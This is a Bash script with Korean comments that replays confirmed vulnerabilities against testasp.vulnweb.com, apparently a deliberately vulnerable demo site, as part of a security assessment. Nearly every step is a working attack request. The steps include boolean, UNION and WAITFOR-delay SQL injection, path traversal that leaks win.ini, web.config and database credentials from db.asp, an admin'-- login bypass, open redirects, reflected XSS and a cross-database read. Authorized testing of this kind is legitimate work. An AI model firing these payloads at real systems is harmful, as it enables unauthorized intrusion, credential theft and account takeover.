#!/usr/bin/env bash
# testphp-vulnweb-test — 확정 취약점 재현 검증 체인 (읽기 전용)
#
# 목적: phase 2 에서 확정한 취약점을 **각 1요청**으로 재확인한다. 쓰기(INSERT/게시/업로드)는
#       포함하지 않는다 — 사이트가 매일 초기화되므로 쓰기 기반 증명은 evidence/ 캡처로만 유효하고,
#       이 스크립트는 "언제든 다시 돌려 상태를 확인"하기 위한 것이다.
# 사용: bash scripts/verify_chain.sh            (mitmproxy 8080 경유, 프록시 없이도 동작)
set -u
B="${B:-http://testasp.vulnweb.com}"
P="${P:--x http://127.0.0.1:8080 --cacert /home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem}"
C="curl -s $P -m 40"
pass=0; fail=0

chk() { # chk "<설명>" "<관측값>" "<기대값>"
  if [ "$2" = "$3" ]; then echo "  [PASS] $1  ($2)"; pass=$((pass+1));
  else echo "  [FAIL] $1  (관측=$2 기대=$3)"; fail=$((fail+1)); fi
}

echo "== 0. 도달성 / 서버 헤더 =="
H=$($C -D- -o /dev/null "$B/Default.asp")
chk "Default.asp 200"           "$(echo "$H" | head -1 | grep -o ' 200 ' | tr -d ' ')" "200"
echo "  Server: $(echo "$H" | grep -i '^Server:' | tr -d '\r')"

echo "== 1. SQLi boolean-blind (showforum.asp id) =="
chk "id=1 → 200"                "$($C -o /dev/null -w '%{http_code}' "$B/showforum.asp?id=1")" "200"
chk "id=1 AND 1=2 → 500"        "$($C -o /dev/null -w '%{http_code}' "$B/showforum.asp?id=1%20AND%201=2")" "500"

echo "== 2. SQLi UNION 페이지 가시 추출 (Search.asp tfSearch) =="
U="q')>0) UNION ALL SELECT 1,'ACU-VERIFY-OK','T','M',1,1,GETDATE(),'A','TT','FN'--"
OUT=$($C "$B/Search.asp?tfSearch=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$U")")
chk "주입 SELECT 값이 페이지에 렌더" "$(echo "$OUT" | grep -c 'ACU-VERIFY-OK')" "1"

echo "== 3. stacked query 차분 오라클 (showthread.asp id) =="
T1=$($C -o /dev/null -w '%{time_total}' "$B/showthread.asp?id=0%3BIF%201%3D1%20WAITFOR%20DELAY%20%270%3A0%3A03%27--")
T2=$($C -o /dev/null -w '%{time_total}' "$B/showthread.asp?id=0%3BIF%201%3D2%20WAITFOR%20DELAY%20%270%3A0%3A03%27--")
echo "  참조건=${T1}s / 거짓조건=${T2}s"
chk "참 조건이 3초 이상 지연"    "$(python3 -c "print('yes' if float('$T1')>3 else 'no')")" "yes"
chk "거짓 조건은 지연 없음"      "$(python3 -c "print('yes' if float('$T2')<3 else 'no')")" "yes"

echo "== 4. directory traversal 임의 파일 읽기 (Templatize.asp item) =="
UP="../../../../../../../../"
OUT=$($C "$B/Templatize.asp?item=${UP}windows%2Fwin.ini")
chk "win.ini 내용 유출"          "$(echo "$OUT" | grep -c 'for 16-bit app support')" "1"
OUT2=$($C "$B/Templatize.asp?item=html/../web.config")
chk "web.config 유출"            "$(echo "$OUT2" | grep -c '<configuration>')" "1"

echo "== 5. 소스 유출 + 하드코딩 DB 자격증명 (traversal 경유) =="
OUT=$($C "$B/Templatize.asp?item=db.asp")
chk "db.asp 소스 유출"           "$(echo "$OUT" | grep -c 'conn.Open')" "1"
echo "  자격증명 라인: $(echo "$OUT" | grep -o 'Uid=[^"]*' | head -1)"

echo "== 6. Login.asp SQLi 인증 우회 =="
J=$(mktemp); $C -c "$J" "$B/Login.asp" -o /dev/null
L=$($C -b "$J" -c "$J" -X POST "$B/Login.asp" --data "tfUName=admin'--&tfUPass=x" -D- -o /dev/null | grep -i '^Location:' | tr -d '\r')
chk "우회 로그인 → Default.asp"  "$(echo "$L" | grep -c 'Default.asp')" "1"
chk "우회 세션 인증됨"           "$($C -b "$J" "$B/Default.asp" | grep -c 'logout ')" "1"
rm -f "$J"

echo "== 7. RetURL open redirect (Login.asp / Logout.asp) =="
# Login.asp 는 **로그인 POST 가 성공해야** Response.Redirect 가 실행된다(자격증명 없이 GET 만 하면 폼만 렌더)
RL=$($C -D- -o /dev/null -X POST "$B/Login.asp?RetURL=http%3A%2F%2Fexample.com%2F" \
      --data "tfUName=admin'--&tfUPass=x" | grep -i '^Location:' | tr -d '\r')
chk "/Login.asp?RetURL= 외부 리다이렉트(우회 로그인 필요)" "$(echo "$RL" | grep -c 'example.com')" "1"
RL=$($C -D- -o /dev/null "$B/Logout.asp?RetURL=http%3A%2F%2Fexample.com%2F" | grep -i '^Location:' | tr -d '\r')
chk "/Logout.asp?RetURL= 외부 리다이렉트" "$(echo "$RL" | grep -c 'example.com')" "1"

echo "== 8. reflected XSS (Search.asp tfSearch) =="
OUT=$($C "$B/Search.asp?tfSearch=%3Cscript%3Ealert(1)%3C%2Fscript%3E")
chk "스크립트 태그 그대로 반사" "$(echo "$OUT" | grep -c "<script>alert(1)</script>")" "1"

echo "== 9. 세션 쿠키 속성 =="
CK=$($C -D- -o /dev/null "$B/Default.asp" | grep -i '^Set-Cookie:' | tr -d '\r')
chk "HttpOnly 부재"  "$(echo "$CK" | grep -ci 'httponly')" "0"
chk "Secure 부재"    "$(echo "$CK" | grep -ci 'secure')"   "0"
chk "SameSite 부재"  "$(echo "$CK" | grep -ci 'samesite')" "0"

echo "== 10. 보안 헤더 부재 =="
for h in content-security-policy x-frame-options x-content-type-options; do
  chk "$h 부재" "$(echo "$H" | grep -ci "^$h:")" "0"
done

echo "== 11. 교차 DB 읽기 (acuforum SQLi → 인접 앱 DB) =="
U2="q')>0) UNION ALL SELECT 1,CAST((SELECT COUNT(*) FROM acublog.dbo.comments) AS nvarchar(20)),'T','M',1,1,GETDATE(),'A','TT','FN'--"
OUT=$($C "$B/Search.asp?tfSearch=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$U2")")
echo "  acublog.comments 행 수 응답에 포함: $(echo "$OUT" | grep -c '<b>[0-9]')"

echo "== 12. 음성(재시도 금지) 재확인 =="
chk "PUT 업로드 불가(404)"       "$($C -o /dev/null -w '%{http_code}' -X PUT --data x "$B/verify_probe.txt")" "404"
chk "TRACE 501"                  "$($C -o /dev/null -w '%{http_code}' -X TRACE "$B/Default.asp")" "501"
chk "IIS 8.3 단축명 404"         "$($C -o /dev/null -w '%{http_code}' "$B/Default~1.asp")" "404"
chk "RetURL CRLF 인코딩(헤더 인젝션 불가)" \
  "$($C -D- -o /dev/null -X POST "$B/Login.asp?RetURL=%2FDefault.asp%0d%0aSet-Cookie:%20x=1" --data "tfUName=admin'--&tfUPass=x" | grep -ci 'splittest')" "0"

echo
echo "결과: PASS=$pass  FAIL=$fail"
[ "$fail" -eq 0 ] && echo "→ 모든 검증 항목이 기대값과 일치 (재현성 확인)" || echo "→ FAIL 항목은 코드/데이터 변경 가능성 — 원문 응답 확인 필요"
